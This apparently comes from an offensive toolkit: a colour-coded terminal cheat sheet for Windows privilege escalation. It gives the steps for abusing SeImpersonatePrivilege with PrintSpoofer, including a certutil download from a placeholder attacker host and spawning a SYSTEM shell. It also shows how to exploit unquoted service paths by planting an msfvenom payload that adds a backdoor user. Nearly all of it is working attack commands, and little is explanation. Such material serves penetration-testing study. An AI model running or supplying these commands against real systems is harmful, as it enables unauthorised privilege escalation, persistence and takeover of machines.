\033[0;34m##################################################################\033[0m
\033[1;35m=== SeImpersonatePrivilege ===\033[0m
\033[0;31m- exploit with 'PrintSpoofer' -\033[0m
\033[1;31mon linux :\033[0m
python3 -m http.server 80

\033[1;31mon windows:\033[0m
certutil -urlcache -f http://<ATTACKER_IP>/<PrinterSpoofer.exe> C:\\Users\\public\\<PrintSpoofer.exe>
PrintSpoofer.exe -h
\033[0;37m...\033[0m

\033[0;31m- Spawn System Process (Elevated Privileges) -\033[0m
PrintSpoofer.exe -i -c cmd
\033[0;34m##################################################################\033[0m
\033[1;35m=== Unquoted Service Path ===\033[0m
\033[0;31m- Find binaries with spaces in the binary path -\033[0m
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

\033[3;31m- [!] if you find binaries with 'unquoted service paths' -\033[0m
\033[1;31m[1] Copy the path for reference\033[0m
\033[0;31me.g: \033[0mC:\Users\user\\\033[5;31mOpenVPN\033[0m Connect\ovpnhelper_service.exe

\033[1;31m[2] Generate a binary with msfvenom (make sure the name matches the cut pathname) \033[0m
msfvenom -p windows/adduser USER=unquoted PASS=Password123! -f exe -o \033[5;31mOpenVPN.exe\033[0m

\033[1;31m[3] Copy the msfvenom binary into a folder below the actual binary\033[0m
\033[0;31me.g: \033[0mC:\Users\user\<PLACE_BINARY_HERE>\OpenVPN Connect\ovpnhelper_service.exe

\033[1;31m[4] Start/Restart the service or machine \033[0m
\033[0;34m##################################################################\033[0m
\n
